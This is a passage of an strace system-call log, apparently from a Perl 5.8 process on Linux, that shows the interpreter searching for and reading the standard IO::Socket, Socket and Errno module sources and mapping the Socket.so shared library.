5970  07:11:35.461288 read(6, "# IO::Socket.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket;\n\nrequire 5.006;\n\nuse IO::Handle;\nuse Socket 1.3;\nuse Carp;\nuse strict;\nour(@ISA, $VERSION, @EXPORT_OK);\nuse Exporter;\nuse Errno;\n\n# legacy\n\nrequire IO::Socket::INET;\nrequire IO::Socket::UNIX if ($^O ne \'epoc\' && $^O ne \'symbian\');\n\n@ISA = qw(IO::Handle);\n\n$VERSION = \"1.29\";\n\n@EXPORT_OK = qw(sockatmark);\n\nsub import {\n    my $pkg = shift;\n    if (@_ && $_[0] eq \'sockatmark\') { # not very extensible but for now, fast\n\tExporter::export_to_level(\'IO::Socket\', 1, $pkg, \'sockatmark\');\n    } else {\n\tmy $callpkg = caller;\n\tExporter::export \'Socket\', $callpkg, @_;\n    }\n}\n\nsub new {\n    my($class,%arg) = @_;\n    my $sock = $class->SUPER::new();\n\n    $sock->autoflush(1);\n\n    ${*$sock}{\'io_socket_timeout\'} = delete $arg{Timeout};\n\n    return scalar(%arg) ? $sock->configure(\\%arg)\n\t\t\t: $sock;\n}\n\nmy @domain2pkg;\n\nsub register_domain {\n    my($p,$d) = @_;\n    $domain2pkg[$d] = $p;\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my $domain = delete $arg->{Domain};\n\n    croak \'IO::Socket: Cannot configure a generic socket\'\n\tunless defined $domain;\n\n    croak \"IO::Socket: Unsupported socket domain\"\n\tunless defined $domain2pkg[$domain];\n\n    croak \"IO::Socket: Cannot configure socket in domain \'$domain\'\"\n\tunless ref($sock) eq \"IO::Socket\";\n\n    bless($sock, $domain2pkg[$domain]);\n    $sock->configure($arg);\n}\n\nsub socket {\n    @_ == 4 or croak \'usage: $sock->socket(DOMAIN, TYPE, PROTOCOL)\';\n    my($sock,$domain,$type,$protocol) = @_;\n\n    socket($sock,$domain,$type,$protocol) or\n    \treturn undef;\n\n    ${*$sock}{\'io_socket_domain\'} = $domain;\n    ${*$sock}{\'io_socket_type\'}   = $type;\n    ${*$sock}{\'io_socket_proto\'}  = $protocol;\n\n    $sock;\n}\n\nsub socketpair {\n    @_ == 4 || croak \'usage: IO::Socket->socketpair(DOMAIN, TYPE, PROTOCOL)\';\n    my($class,$domain,$type,$protocol) = @_;\n    my $sock1 = $class->new();\n    my $sock2 = $class->new();\n\n    socketpair($sock1,$sock2,$domain,$type,$protocol) or\n    \treturn ();\n\n    ${*$sock1}{\'io_socket_type\'}  = ${*$sock2}{\'io_socket_type\'}  = $type;\n    ${*$sock1}{\'io_socket_proto\'} = ${*$sock2}{\'io_socket_proto\'} = $protocol;\n\n    ($sock1,$sock2);\n}\n\nsub connect {\n    @_ == 2 or croak \'usage: $sock->connect(NAME)\';\n    my $sock = shift;\n    my $addr = shift;\n    my $timeout = ${*$sock}{\'io_socket_timeout\'};\n    my $err;\n    my $blocking;\n\n    $blocking = $sock->blocking(0) if $timeout;\n    if (!connect($sock, $addr)) {\n\tif (defined $timeout && $!{EINPROGRESS}) {\n\t    require IO::Select;\n\n\t    my $sel = new IO::Select $sock;\n\n\t    if (!$sel->can_write($timeout)) {\n\t\t$err = $! || (exists &Errno::ETIMEDOUT ? &Errno::ETIMEDOUT : 1);\n\t\t$@ = \"connect: timeout\";\n\t    }\n\t    elsif (!connect($sock,$addr) && not $!{EISCONN}) {\n\t\t# Some systems refuse to re-connect() to\n\t\t# an already open socket and set errno to EISCONN.\n\t\t$err = $!;\n\t\t$@ = \"connect: $!\";\n\t    }\n\t}\n        elsif ($blocking || !$!{EINPROGRESS})  {\n\t    $err = $!;\n\t    $@ = \"connect: $!\";\n\t}\n    }\n\n    $sock->blocking(1) if $blocking;\n\n    $! = $err if $err;\n\n    $err ? undef : $sock;\n}\n\nsub bind {\n    @_ == 2 or croak \'usage: $sock->bind(NAME)\';\n    my $sock = shift;\n    my $addr = shift;\n\n    return bind($sock, $addr) ? $sock\n\t\t\t      : undef;\n}\n\nsub listen {\n    @_ >= 1 && @_ <= 2 or croak \'usage: $sock->listen([QUEUE])\';\n    my($sock,$queue) = @_;\n    $queue = 5\n\tunless $queue && $queue > 0;\n\n    return listen($sock, $queue) ? $sock\n\t\t\t\t : undef;\n}\n\nsub accept {\n    @_ == 1 || @_ == 2 or croak \'usage $sock->accept([PKG])\';\n    my $sock = shift;\n    my $pkg = shift || $sock;\n    my $timeout = ${*$sock}{\'io_socket_timeout\'};\n    my $new = $pkg->new(Timeout => $timeout);\n    my $peer = undef;\n\n    if(defined $timeout) {\n\trequire IO::Select;\n\n\tmy $sel = new IO::Select $sock;\n\n\tunless ($sel->can_read($timeout)) {\n\t    $@ = \'accept: timeout\';\n\t    $! = (exists &Errno::ETIMEDOUT ? &Errno::ETIMEDOUT : 1);\n\t    return;\n\t}\n", 4096) = 4096
5970  07:11:35.461677 stat64("/etc/perl/Socket.pmc", 0xbf8eb98c) = -1 ENOENT (No such file or directory)
5970  07:11:35.461693 stat64("/etc/perl/Socket.pm", 0xbf8eb89c) = -1 ENOENT (No such file or directory)
5970  07:11:35.461706 stat64("/usr/local/lib/perl/5.8.8/Socket.pmc", 0xbf8eb98c) = -1 ENOENT (No such file or directory)
5970  07:11:35.461718 stat64("/usr/local/lib/perl/5.8.8/Socket.pm", 0xbf8eb89c) = -1 ENOENT (No such file or directory)
5970  07:11:35.461736 stat64("/usr/local/share/perl/5.8.8/Socket.pmc", 0xbf8eb98c) = -1 ENOENT (No such file or directory)
5970  07:11:35.461748 stat64("/usr/local/share/perl/5.8.8/Socket.pm", 0xbf8eb89c) = -1 ENOENT (No such file or directory)
5970  07:11:35.461762 stat64("/usr/lib/perl5/Socket.pmc", 0xbf8eb98c) = -1 ENOENT (No such file or directory)
5970  07:11:35.461774 stat64("/usr/lib/perl5/Socket.pm", 0xbf8eb89c) = -1 ENOENT (No such file or directory)
5970  07:11:35.461787 stat64("/usr/share/perl5/Socket.pmc", 0xbf8eb98c) = -1 ENOENT (No such file or directory)
5970  07:11:35.461798 stat64("/usr/share/perl5/Socket.pm", 0xbf8eb89c) = -1 ENOENT (No such file or directory)
5970  07:11:35.461811 stat64("/usr/lib/perl/5.8/Socket.pmc", 0xbf8eb98c) = -1 ENOENT (No such file or directory)
5970  07:11:35.461824 stat64("/usr/lib/perl/5.8/Socket.pm", {st_mode=S_IFREG|0644, st_size=3514, ...}) = 0
5970  07:11:35.461844 open("/usr/lib/perl/5.8/Socket.pm", O_RDONLY|O_LARGEFILE) = 8
5970  07:11:35.461904 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8eb6a8) = -1 ENOTTY (Inappropriate ioctl for device)
5970  07:11:35.461916 _llseek(8, 0, [0], SEEK_CUR) = 0
5970  07:11:35.461962 read(8, "package Socket;\n\nour($VERSION, @ISA, @EXPORT, @EXPORT_OK, %EXPORT_TAGS);\n$VERSION = \"1.78\";\n\nuse Carp;\nuse warnings::register;\n\nrequire Exporter;\nuse XSLoader ();\n@ISA = qw(Exporter);\n@EXPORT = qw(\n\tinet_aton inet_ntoa\n\tsockaddr_family\n\tpack_sockaddr_in unpack_sockaddr_in\n\tpack_sockaddr_un unpack_sockaddr_un\n\tsockaddr_in sockaddr_un\n\tINADDR_ANY INADDR_BROADCAST INADDR_LOOPBACK INADDR_NONE\n\tAF_802\n\tAF_AAL\n\tAF_APPLETALK\n\tAF_CCITT\n\tAF_CHAOS\n\tAF_CTF\n\tAF_DATAKIT\n\tAF_DECnet\n\tAF_DLI\n\tAF_ECMA\n\tAF_GOSIP\n\tAF_HYLINK\n\tAF_IMPLINK\n\tAF_INET\n\tAF_INET6\n\tAF_ISO\n\tAF_KEY\n\tAF_LAST\n\tAF_LAT\n\tAF_LINK\n\tAF_MAX\n\tAF_NBS\n\tAF_NIT\n\tAF_NS\n\tAF_OSI\n\tAF_OSINET\n\tAF_PUP\n\tAF_ROUTE\n\tAF_SNA\n\tAF_UNIX\n\tAF_UNSPEC\n\tAF_USER\n\tAF_WAN\n\tAF_X25\n\tIOV_MAX\n\tMSG_BCAST\n\tMSG_BTAG\n\tMSG_CTLFLAGS\n\tMSG_CTLIGNORE\n\tMSG_CTRUNC\n\tMSG_DONTROUTE\n\tMSG_DONTWAIT\n\tMSG_EOF\n\tMSG_EOR\n\tMSG_ERRQUEUE\n\tMSG_ETAG\n\tMSG_FIN\n\tMSG_MAXIOVLEN\n\tMSG_MCAST\n\tMSG_NOSIGNAL\n\tMSG_OOB\n\tMSG_PEEK\n\tMSG_PROXY\n\tMSG_RST\n\tMSG_SYN\n\tMSG_TRUNC\n\tMSG_URG\n\tMSG_WAITALL\n\tMSG_WIRE\n\tPF_802\n\tPF_AAL\n\tPF_APPLETALK\n\tPF_CCITT\n\tPF_CHAOS\n\tPF_CTF\n\tPF_DATAKIT\n\tPF_DECnet\n\tPF_DLI\n\tPF_ECMA\n\tPF_GOSIP\n\tPF_HYLINK\n\tPF_IMPLINK\n\tPF_INET\n\tPF_INET6\n\tPF_ISO\n\tPF_KEY\n\tPF_LAST\n\tPF_LAT\n\tPF_LINK\n\tPF_MAX\n\tPF_NBS\n\tPF_NIT\n\tPF_NS\n\tPF_OSI\n\tPF_OSINET\n\tPF_PUP\n\tPF_ROUTE\n\tPF_SNA\n\tPF_UNIX\n\tPF_UNSPEC\n\tPF_USER\n\tPF_WAN\n\tPF_X25\n\tSCM_CONNECT\n\tSCM_CREDENTIALS\n\tSCM_CREDS\n\tSCM_RIGHTS\n\tSCM_TIMESTAMP\n\tSHUT_RD\n\tSHUT_RDWR\n\tSHUT_WR\n\tSOCK_DGRAM\n\tSOCK_RAW\n\tSOCK_RDM\n\tSOCK_SEQPACKET\n\tSOCK_STREAM\n\tSOL_SOCKET\n\tSOMAXCONN\n\tSO_ACCEPTCONN\n\tSO_ATTACH_FILTER\n\tSO_BACKLOG\n\tSO_BROADCAST\n\tSO_CHAMELEON\n\tSO_DEBUG\n\tSO_DETACH_FILTER\n\tSO_DGRAM_ERRIND\n\tSO_DONTLINGER\n\tSO_DONTROUTE\n\tSO_ERROR\n\tSO_FAMILY\n\tSO_KEEPALIVE\n\tSO_LINGER\n\tSO_OOBINLINE\n\tSO_PASSCRED\n\tSO_PASSIFNAME\n\tSO_PEERCRED\n\tSO_PROTOCOL\n\tSO_PROTOTYPE\n\tSO_RCVBUF\n\tSO_RCVLOWAT\n\tSO_RCVTIMEO\n\tSO_REUSEADDR\n\tSO_REUSEPORT\n\tSO_SECURITY_AUTHENTICATION\n\tSO_SECURITY_ENCRYPTION_NETWORK\n\tSO_SECURITY_ENCRYPTION_TRANSPORT\n\tSO_SNDBUF\n\tSO_SNDLOWAT\n\tSO_SNDTIMEO\n\tSO_STATE\n\tSO_TYPE\n\tSO_USELOOPBACK\n\tSO_XOPEN\n\tSO_XSE\n\tUIO_MAXIOV\n);\n\n@EXPORT_OK = qw(CR LF CRLF $CR $LF $CRLF\n\n\t       IPPROTO_TCP\n\t       TCP_KEEPALIVE\n\t       TCP_MAXRT\n\t       TCP_MAXSEG\n\t       TCP_NODELAY\n\t       TCP_STDURG);\n\n%EXPORT_TAGS = (\n    crlf    => [qw(CR LF CRLF $CR $LF $CRLF)],\n    all     => [@EXPORT, @EXPORT_OK],\n);\n\nBEGIN {\n    sub CR   () {\"\\015\"}\n    sub LF   () {\"\\012\"}\n    sub CRLF () {\"\\015\\012\"}\n}\n\n*CR   = \\CR();\n*LF   = \\LF();\n*CRLF = \\CRLF();\n\nsub sockaddr_in {\n    if (@_ == 6 && !wantarray) { # perl5.001m compat; use this && die\n\tmy($af, $port, @quad) = @_;\n\twarnings::warn \"6-ARG sockaddr_in call is deprecated\" \n\t    if warnings::enabled();\n\tpack_sockaddr_in($port, inet_aton(join(\'.\', @quad)));\n    } elsif (wantarray) {\n\tcroak \"usage:   (port,iaddr) = sockaddr_in(sin_sv)\" unless @_ == 1;\n        unpack_sockaddr_in(@_);\n    } else {\n\tcroak \"usage:   sin_sv = sockaddr_in(port,iaddr))\" unless @_ == 2;\n        pack_sockaddr_in(@_);\n    }\n}\n\nsub sockaddr_un {\n    if (wantarray) {\n\tcroak \"usage:   (filename) = sockaddr_un(sun_sv)\" unless @_ == 1;\n        unpack_sockaddr_un(@_);\n    } else {\n\tcroak \"usage:   sun_sv = sockaddr_un(filename)\" unless @_ == 1;\n        pack_sockaddr_un(@_);\n    }\n}\n\nsub AUTOLOAD {\n    my($constname);\n    ($constname = $AUTOLOAD) =~ s/.*:://;\n    croak \"&Socket::constant not defined\" if $constname eq \'constant\';\n    my ($error, $val) = constant($constname);\n    if ($error) {\n\tcroak $error;\n    }\n    *$AUTOLOAD = sub { $val };\n    goto &$AUTOLOAD;\n}\n\nXSLoader::load \'Socket\', $VERSION;\n\n1;\n", 4096) = 3514
5970  07:11:35.462344 brk(0x8239000)    = 0x8239000
5970  07:11:35.462636 read(8, "", 4096) = 0
5970  07:11:35.462651 close(8)          = 0
5970  07:11:35.462737 stat64("/usr/lib/perl/5.8/auto/Socket/Socket.so", {st_mode=S_IFREG|0644, st_size=19676, ...}) = 0
5970  07:11:35.462763 stat64("/usr/lib/perl/5.8/auto/Socket/Socket.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
5970  07:11:35.462790 open("/usr/lib/perl/5.8/auto/Socket/Socket.so", O_RDONLY) = 8
5970  07:11:35.462804 read(8, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\360\16\0\0004\0\0\0\34I\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\264F\0\0\264F\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264F\0\0\264V\0\0\264V\0\0\274\1\0\0\300\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\310F\0\0\310V\0\0\310V\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0%\0\0\0008\0\0\0\0\0\0\0\10\0\0\0\22\0\0\0\35\0\0\0\0\0\0\0)\0\0\0\0\0\0\0\0\0\0\0\7\0\0\0\37\0\0\0\0\0\0\0\0\0\0\0007\0\0\0$\0\0\0-\0\0\0(\0\0\0\36\0\0\0\n\0\0\0,\0\0\0001\0\0\0 \0\0\0\0\0\0\0000\0\0\0\0\0\0\0005\0\0\0!\0\0\0\0\0\0\0\30\0\0\0002\0\0\0\27\0\0\0\'\0\0\0+\0\0\0\f\0\0\0\0\0\0\0.\0\0\0/\0\0\0&\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0*\0\0\0\0\0\0\0\t\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\4\0\0\0\17\0\0\0\0\0\0\0\6\0\0\0\20\0\0\0\0\0\0\0\21\0\0\0\24\0\0\0\26\0\0\0\0\0\0\0\23\0\0\0\0\0\0\0\25\0\0\0\0\0\0\0\0\0\0\0\r\0\0\0\0\0\0\0\31\0\0\0003\0\0\0\0\0\0\0\34\0\0\0\0\0\0\0\0\0\0\0%\0\0\0#\0\0\0\5\0\0\0004\0\0\0\0\0\0\0\33\0\0\0", 512) = 512
5970  07:11:35.462954 fstat64(8, {st_mode=S_IFREG|0644, st_size=19676, ...}) = 0
5970  07:11:35.462974 mmap2(NULL, 22644, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 8, 0) = 0xb7d09000
5970  07:11:35.462987 mmap2(0xb7d0e000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 8, 0x4) = 0xb7d0e000
5970  07:11:35.463003 close(8)          = 0
5970  07:11:35.463610 brk(0x825a000)    = 0x825a000
5970  07:11:35.463756 stat64("/etc/perl/Errno.pmc", 0xbf8eb98c) = -1 ENOENT (No such file or directory)
5970  07:11:35.463773 stat64("/etc/perl/Errno.pm", 0xbf8eb89c) = -1 ENOENT (No such file or directory)
5970  07:11:35.463787 stat64("/usr/local/lib/perl/5.8.8/Errno.pmc", 0xbf8eb98c) = -1 ENOENT (No such file or directory)
5970  07:11:35.463799 stat64("/usr/local/lib/perl/5.8.8/Errno.pm", 0xbf8eb89c) = -1 ENOENT (No such file or directory)
5970  07:11:35.463813 stat64("/usr/local/share/perl/5.8.8/Errno.pmc", 0xbf8eb98c) = -1 ENOENT (No such file or directory)
5970  07:11:35.463825 stat64("/usr/local/share/perl/5.8.8/Errno.pm", 0xbf8eb89c) = -1 ENOENT (No such file or directory)
5970  07:11:35.463839 stat64("/usr/lib/perl5/Errno.pmc", 0xbf8eb98c) = -1 ENOENT (No such file or directory)
5970  07:11:35.463899 stat64("/usr/lib/perl5/Errno.pm", 0xbf8eb89c) = -1 ENOENT (No such file or directory)
5970  07:11:35.463926 stat64("/usr/share/perl5/Errno.pmc", 0xbf8eb98c) = -1 ENOENT (No such file or directory)
5970  07:11:35.463956 stat64("/usr/share/perl5/Errno.pm", 0xbf8eb89c) = -1 ENOENT (No such file or directory)
5970  07:11:35.463969 stat64("/usr/lib/perl/5.8/Errno.pmc", 0xbf8eb98c) = -1 ENOENT (No such file or directory)
5970  07:11:35.463982 stat64("/usr/lib/perl/5.8/Errno.pm", {st_mode=S_IFREG|0644, st_size=5967, ...}) = 0
5970  07:11:35.464003 open("/usr/lib/perl/5.8/Errno.pm", O_RDONLY|O_LARGEFILE) = 8
5970  07:11:35.464017 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8eb6a8) = -1 ENOTTY (Inappropriate ioctl for device)
5970  07:11:35.464028 _llseek(8, 0, [0], SEEK_CUR) = 0
5970  07:11:35.464047 read(8, "#\n# This file is auto-generated. ***ANY*** changes here will be lost\n#\n\npackage Errno;\nour (@EXPORT_OK,%EXPORT_TAGS,@ISA,$VERSION,%errno,$AUTOLOAD);\nuse Exporter ();\nuse strict;\n\n$VERSION = \"1.09_01\";\n$VERSION = eval $VERSION;\n@ISA = qw(Exporter);\n\n@EXPORT_OK = qw(EBADR ENOMSG ENOTSUP ESTRPIPE EADDRINUSE EL3HLT EBADF\n\tENOTBLK ENAVAIL ECHRNG ENOTNAM ELNRNG ENOKEY EXDEV EBADE EBADSLT\n\tECONNREFUSED ENOSTR ENONET EOVERFLOW EISCONN EFBIG EKEYREVOKED\n\tECONNRESET EWOULDBLOCK ELIBMAX EREMOTEIO ENOPKG ELIBSCN EDESTADDRREQ\n\tENOTSOCK EIO EMEDIUMTYPE EINPROGRESS ERANGE EAFNOSUPPORT EADDRNOTAVAIL\n\tEINTR EREMOTE EILSEQ ENOMEM EPIPE ENETUNREACH ENODATA EUSERS\n\tEOPNOTSUPP EPROTO EISNAM ESPIPE EALREADY ENAMETOOLONG ENOEXEC EISDIR\n\tEBADRQC EEXIST EDOTDOT ELIBBAD EOWNERDEAD ESRCH EFAULT EXFULL\n\tEDEADLOCK EAGAIN ENOPROTOOPT ENETDOWN EPROTOTYPE EL2NSYNC ENETRESET\n\tEUCLEAN EADV EROFS ESHUTDOWN EMULTIHOP EPROTONOSUPPORT ENFILE ENOLCK\n\tECONNABORTED ECANCELED EDEADLK ESRMNT ENOLINK ETIME ENOTDIR EINVAL\n\tENOTTY ENOANO ELOOP ENOENT EPFNOSUPPORT EBADMSG ENOMEDIUM EL2HLT EDOM\n\tEBFONT EKEYEXPIRED EMSGSIZE ENOCSI EL3RST ENOSPC EIDRM ENOBUFS ENOSYS\n\tEHOSTDOWN EBADFD ENOSR ENOTCONN ESTALE EDQUOT EKEYREJECTED EMFILE\n\tENOTRECOVERABLE EACCES EBUSY E2BIG EPERM ELIBEXEC ETOOMANYREFS ELIBACC\n\tENOTUNIQ ECOMM ERESTART ESOCKTNOSUPPORT EUNATCH ETIMEDOUT ENXIO ENODEV\n\tETXTBSY EMLINK ECHILD EHOSTUNREACH EREMCHG ENOTEMPTY);\n\t\n%EXPORT_TAGS = (\n    POSIX => [qw(\n\tE2BIG EACCES EADDRINUSE EADDRNOTAVAIL EAFNOSUPPORT EAGAIN EALREADY\n\tEBADF EBUSY ECHILD ECONNABORTED ECONNREFUSED ECONNRESET EDEADLK\n\tEDESTADDRREQ EDOM EDQUOT EEXIST EFAULT EFBIG EHOSTDOWN EHOSTUNREACH\n\tEINPROGRESS EINTR EINVAL EIO EISCONN EISDIR ELOOP EMFILE EMLINK\n\tEMSGSIZE ENAMETOOLONG ENETDOWN ENETRESET ENETUNREACH ENFILE ENOBUFS\n\tENODEV ENOENT ENOEXEC ENOLCK ENOMEM ENOPROTOOPT ENOSPC ENOSYS ENOTBLK\n\tENOTCONN ENOTDIR ENOTEMPTY ENOTSOCK ENOTTY ENXIO EOPNOTSUPP EPERM\n\tEPFNOSUPPORT EPIPE EPROTONOSUPPORT EPROTOTYPE ERANGE EREMOTE ERESTART\n\tEROFS ESHUTDOWN ESOCKTNOSUPPORT ESPIPE ESRCH ESTALE ETIMEDOUT\n\tETOOMANYREFS ETXTBSY EUSERS EWOULDBLOCK EXDEV\n    )]\n);\n\nsub EPERM () { 1 }\nsub ENOENT () { 2 }\nsub ESRCH () { 3 }\nsub EINTR () { 4 }\nsub EIO () { 5 }\nsub ENXIO () { 6 }\nsub E2BIG () { 7 }\nsub ENOEXEC () { 8 }\nsub EBADF () { 9 }\nsub ECHILD () { 10 }\nsub EWOULDBLOCK () { 11 }\nsub EAGAIN () { 11 }\nsub ENOMEM () { 12 }\nsub EACCES () { 13 }\nsub EFAULT () { 14 }\nsub ENOTBLK () { 15 }\nsub EBUSY () { 16 }\nsub EEXIST () { 17 }\nsub EXDEV () { 18 }\nsub ENODEV () { 19 }\nsub ENOTDIR () { 20 }\nsub EISDIR () { 21 }\nsub EINVAL () { 22 }\nsub ENFILE () { 23 }\nsub EMFILE () { 24 }\nsub ENOTTY () { 25 }\nsub ETXTBSY () { 26 }\nsub EFBIG () { 27 }\nsub ENOSPC () { 28 }\nsub ESPIPE () { 29 }\nsub EROFS () { 30 }\nsub EMLINK () { 31 }\nsub EPIPE () { 32 }\nsub EDOM () { 33 }\nsub ERANGE () { 34 }\nsub EDEADLOCK () { 35 }\nsub EDEADLK () { 35 }\nsub ENAMETOOLONG () { 36 }\nsub ENOLCK () { 37 }\nsub ENOSYS () { 38 }\nsub ENOTEMPTY () { 39 }\nsub ELOOP () { 40 }\nsub ENOMSG () { 42 }\nsub EIDRM () { 43 }\nsub ECHRNG () { 44 }\nsub EL2NSYNC () { 45 }\nsub EL3HLT () { 46 }\nsub EL3RST () { 47 }\nsub ELNRNG () { 48 }\nsub EUNATCH () { 49 }\nsub ENOCSI () { 50 }\nsub EL2HLT () { 51 }\nsub EBADE () { 52 }\nsub EBADR () { 53 }\nsub EXFULL () { 54 }\nsub ENOANO () { 55 }\nsub EBADRQC () { 56 }\nsub EBADSLT () { 57 }\nsub EBFONT () { 59 }\nsub ENOSTR () { 60 }\nsub ENODATA () { 61 }\nsub ETIME () { 62 }\nsub ENOSR () { 63 }\nsub ENONET () { 64 }\nsub ENOPKG () { 65 }\nsub EREMOTE () { 66 }\nsub ENOLINK () { 67 }\nsub EADV () { 68 }\nsub ESRMNT () { 69 }\nsub ECOMM () { 70 }\nsub EPROTO () { 71 }\nsub EMULTIHOP () { 72 }\nsub EDOTDOT () { 73 }\nsub EBADMSG () { 74 }\nsub EOVERFLOW () { 75 }\nsub ENOTUNIQ () { 76 }\nsub EBADFD () { 77 }\nsub EREMCHG () { 78 }\nsub ELIBACC () { 79 }\nsub ELIBBAD () { 80 }\nsub ELIBSCN () { 81 }\nsub ELIBMAX () { 82 }\nsub ELIBEXEC () { 83 }\nsub EILSEQ () { 84 }\nsub ERESTART () { 85 }\nsub ESTRPIPE () { 86 }\nsub EUSERS () { 87 }\nsub ENOTSOCK () { 88 }\nsub EDESTADDRREQ () { 89 }\nsub EMSGSIZE () { 90 }\nsub EPROTOTYPE () { 91 }\nsub ENOPROTOOPT () { 92 }\nsub EPROTONOSUPPORT () ", 4096) = 4096
5970  07:11:35.464823 read(8, "{ 93 }\nsub ESOCKTNOSUPPORT () { 94 }\nsub ENOTSUP () { 95 }\nsub EOPNOTSUPP () { 95 }\nsub EPFNOSUPPORT () { 96 }\nsub EAFNOSUPPORT () { 97 }\nsub EADDRINUSE () { 98 }\nsub EADDRNOTAVAIL () { 99 }\nsub ENETDOWN () { 100 }\nsub ENETUNREACH () { 101 }\nsub ENETRESET () { 102 }\nsub ECONNABORTED () { 103 }\nsub ECONNRESET () { 104 }\nsub ENOBUFS () { 105 }\nsub EISCONN () { 106 }\nsub ENOTCONN () { 107 }\nsub ESHUTDOWN () { 108 }\nsub ETOOMANYREFS () { 109 }\nsub ETIMEDOUT () { 110 }\nsub ECONNREFUSED () { 111 }\nsub EHOSTDOWN () { 112 }\nsub EHOSTUNREACH () { 113 }\nsub EALREADY () { 114 }\nsub EINPROGRESS () { 115 }\nsub ESTALE () { 116 }\nsub EUCLEAN () { 117 }\nsub ENOTNAM () { 118 }\nsub ENAVAIL () { 119 }\nsub EISNAM () { 120 }\nsub EREMOTEIO () { 121 }\nsub EDQUOT () { 122 }\nsub ENOMEDIUM () { 123 }\nsub EMEDIUMTYPE () { 124 }\nsub ECANCELED () { 125 }\nsub ENOKEY () { 126 }\nsub EKEYEXPIRED () { 127 }\nsub EKEYREVOKED () { 128 }\nsub EKEYREJECTED () { 129 }\nsub EOWNERDEAD () { 130 }\nsub ENOTRECOVERABLE () { 131 }\n\nsub TIEHASH { bless [] }\n\nsub FETCH {\n    my ($self, $errname) = @_;\n    my $proto = prototype(\"Errno::$errname\");\n    my $errno = \"\";\n    if (defined($proto) && $proto eq \"\") {\n\tno strict \'refs\';\n\t$errno = &$errname;\n        $errno = 0 unless $! == $errno;\n    }\n    return $errno;\n}\n\nsub STORE {\n    require Carp;\n    Carp::confess(\"ERRNO hash is read only!\");\n}\n\n*CLEAR = \\&STORE;\n*DELETE = \\&STORE;\n\nsub NEXTKEY {\n    my($k,$v);\n    while(($k,$v) = each %Errno::) {\n\tmy $proto = prototype(\"Errno::$k\");\n\tlast if (defined($proto) && $proto eq \"\");\n    }\n    $k\n}\n\nsub FIRSTKEY {\n    my $s = scalar keys %Errno::;\t# initialize iterator\n    goto &NEXTKEY;\n}\n\nsub EXISTS {\n    my ($self, $errname) = @_;\n    my $r = ref $errname;\n    my $proto = !$r || $r eq \'CODE\' ? prototype($errname) : undef;\n    defined($proto) && $proto eq \"\";\n}\n\ntie %!, __PACKAGE__;\n\n1;\n__END__\n\n", 4096) = 1871
5970  07:11:35.465372 _llseek(8, 5966, [5966], SEEK_SET) = 0
5970  07:11:35.465389 _llseek(8, 0, [5966], SEEK_CUR) = 0
5970  07:11:35.465399 close(8)          = 0
5970  07:11:35.465810 brk(0x827b000)    = 0x827b000
5970  07:11:35.465979 read(6, "    }\n\n    $peer = accept($new,$sock)\n\tor return;\n\n    return wantarray ? ($new, $peer)\n    \t      \t     : $new;\n}\n\nsub sockname {\n    @_ == 1 or croak \'usage: $sock->sockname()\';\n    getsockname($_[0]);\n}\n\nsub peername {\n    @_ == 1 or croak \'usage: $sock->peername()\';\n    my($sock) = @_;\n    getpeername($sock)\n      || ${*$sock}{\'io_socket_peername\'}\n      || undef;\n}\n\nsub connected {\n    @_ == 1 or croak \'usage: $sock->connected()\';\n    my($sock) = @_;\n    getpeername($sock);\n}\n\nsub send {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $sock->send(BUF, [FLAGS, [TO]])\';\n    my $sock  = $_[0];\n    my $flags = $_[2] || 0;\n    my $peer  = $_[3] || $sock->peername;\n\n    croak \'send: Cannot determine peer address\'\n\t unless($peer);\n\n    my $r = defined(getpeername($sock))\n\t? send($sock, $_[1], $flags)\n\t: send($sock, $_[1], $flags, $peer);\n\n    # remember who we send to, if it was successful\n    ${*$sock}{\'io_socket_peername\'} = $peer\n\tif(@_ == 4 && defined $r);\n\n    $r;\n}\n\nsub recv {\n    @_ == 3 || @_ == 4 or croak \'usage: $sock->recv(BUF, LEN [, FLAGS])\';\n    my $sock  = $_[0];\n    my $len   = $_[2];\n    my $flags = $_[3] || 0;\n\n    # remember who we recv\'d from\n    ${*$sock}{\'io_socket_peername\'} = recv($sock, $_[1]=\'\', $len, $flags);\n}\n\nsub shutdown {\n    @_ == 2 or croak \'usage: $sock->shutdown(HOW)\';\n    my($sock, $how) = @_;\n    shutdown($sock, $how);\n}\n\nsub setsockopt {\n    @_ == 4 or croak \'$sock->setsockopt(LEVEL, OPTNAME)\';\n    setsockopt($_[0],$_[1],$_[2],$_[3]);\n}\n\nmy $intsize = length(pack(\"i\",0));\n\nsub getsockopt {\n    @_ == 3 or croak \'$sock->getsockopt(LEVEL, OPTNAME)\';\n    my $r = getsockopt($_[0],$_[1],$_[2]);\n    # Just a guess\n    $r = unpack(\"i\", $r)\n\tif(defined $r && length($r) == $intsize);\n    $r;\n}\n\nsub sockopt {\n    my $sock = shift;\n    @_ == 1 ? $sock->getsockopt(SOL_SOCKET,@_)\n\t    : $sock->setsockopt(SOL_SOCKET,@_);\n}\n\nsub atmark {\n    @_ == 1 or croak \'usage: $sock->atmark()\';\n    my($sock) = @_;\n    sockatmark($sock);\n}\n\nsub timeout {\n    @_ == 1 || @_ == 2 or croak \'usage: $sock->timeout([VALUE])\';\n    my($sock,$val) = @_;\n    my $r = ${*$sock}{\'io_socket_timeout\'};\n\n    ${*$sock}{\'io_socket_timeout\'} = defined $val ? 0 + $val : 